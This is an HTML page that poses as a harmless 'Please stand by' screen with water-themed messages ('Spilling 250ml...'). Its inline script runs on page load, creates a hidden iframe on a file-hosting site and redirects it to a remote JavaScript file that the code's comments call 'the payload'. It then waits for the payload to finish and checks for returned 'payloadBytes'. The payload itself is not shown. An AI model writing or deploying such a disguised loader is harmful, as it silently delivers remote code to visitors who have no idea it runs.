<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>250ml</title>
  <link rel="stylesheet" href="style250.css" />
  <script>
  setTimeout(() => {
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';

    // Loads a generic HTML page
    iframe.src = 'https://files.catbox.moe/7cwlbl.html';

    iframe.onload = () => {
      // Redirects to the payload
      iframe.contentWindow.location.href = 'https://files.catbox.moe/cwedrd.js';
      const now = () => `${Math.floor(performance.now())}ms`;
      document.getElementById("status").textContent = `Spilling 250ml... [${now()}]`;

    };

    iframe.onerror = () => {
      document.getElementById("status").textContent = "Bottle not filled. Try again.";
    };

    setTimeout(() => {
      try {
        const result = window.frames[0].payloadBytes;
        if (result && result instanceof Uint8Array) {
          document.getElementById("status").textContent = "Water spilled successfully!";
        } else {
          document.getElementById("status").textContent = "Nothing's been spilled...";
        }
      } catch (e) {
        document.getElementById("status").textContent = "Some water might have been spilled or not, who knows?";
      }
    }, 5000); // Waits a few seconds after loading to let the payload finish

    document.body.appendChild(iframe);
  }, 1500);
</script>
</head>
<body>
  <div class="container">
    <h1>Please stand by.</h1>
    <p class="note">Spilling 250ml...</p>
    <pre id="status">Filling up water...</pre>
  </div>
</body>
</html>
